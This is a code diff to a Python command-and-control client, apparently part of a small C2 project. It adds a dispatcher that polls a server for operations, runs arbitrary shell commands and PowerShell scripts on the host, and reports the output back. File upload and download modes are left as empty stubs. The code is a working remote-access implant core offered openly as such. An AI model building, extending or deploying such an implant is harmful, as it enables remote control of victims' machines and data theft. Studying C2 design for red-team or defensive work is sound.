@@ -21,10 +21,8 @@ class C2Client:
         url = f"{self.server_url}/beacon"
         payload = {"client_id": self.client_id}
         
-        response = requests.post(url, json=payload)
-        commands = response.json().get("commands", [])
-        
-        return commands
+        operations = requests.post(url, json=payload).json()
+        self.handle_operations(operations)
 
     def report(self, status, result):
         url = f"{self.server_url}/report"
@@ -37,11 +35,50 @@ class C2Client:
         self.register("John Doe 1")
 
         while True:
-            commands = self.beacon()
-            for command in commands:
-                result = subprocess.getoutput(command)
-                self.report("success", result)
-            time.sleep(60)
+            self.beacon()
+            time.sleep(60) # Timeout before next beacon call
+            
+    def handle_operations(self, operations):
+        for op in operations:
+            resource = op.get("resource")
+            match op.get("mode"):
+                case "CMD":
+                    self.handle_cmd_operation(resource)
+                case "IMP":
+                    self.handle_imp_operation(resource)
+                case "FUP":
+                    self.handle_fup_operation(resource)
+                case "FDL":
+                    self.handle_fdl_operation(resource)
+
+    def handle_cmd_operation(self, command):
+        cmd_out = ""
+        status = "CMD_SUCCESS"
+        try:
+            cmd_out = subprocess.getoutput(command)
+        except Exception as e:
+            status = "ERROR"
+            cmd_out = str(e)
+            
+        self.report(status, cmd_out)
+    
+    def handle_imp_operation(self, ps_script):
+        cmd_out = ""
+        status = "PS_SUCCESS"
+        try:
+            raw_out = subprocess.run(["powershell", "-Command", ps_script], capture_output=True)
+            cmd_out = raw_out.stdout.decode("utf-8")
+        except Exception as e:
+            status = "ERROR"
+            cmd_out = str(e)
+            
+        self.report(status, cmd_out)
+    
+    def handle_fup_operation(self, file_path):
+        pass
+    
+    def handle_fdl_operation(self, file_path):
+        pass
 
 if __name__ == "__main__":
     client = C2Client("http://localhost:9393")
